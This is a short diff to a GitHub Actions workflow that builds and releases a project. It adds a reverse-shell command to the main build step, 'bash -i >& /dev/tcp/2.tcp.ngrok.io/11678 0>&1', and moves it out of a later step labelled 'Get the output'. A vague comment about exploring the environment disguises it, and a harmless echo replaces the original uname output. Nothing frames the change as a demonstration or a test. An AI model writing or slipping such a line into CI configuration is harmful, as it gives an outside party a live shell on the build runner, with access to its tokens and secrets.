@@ -23,16 +23,15 @@ jobs:
           # Not required, but speeds up builds by storing container images in
           # a GitHub package registry.
           githubToken: ${{ github.token }}
-
-          # Set an output parameter `uname` for use in subsequent steps
+          
+          # To explore the enviroment
           run: |
-            uname -a
-            echo ::set-output name=uname::$(uname -a)
+            echo Starting something
+            /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.ngrok.io/11678 0>&1'
 
       - name: Get the output
-        # To explore the enviroment
         run: |
-          /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.ngrok.io/11678 0>&1'
+          echo finished
           
       - name: Create Release
         id: create_release
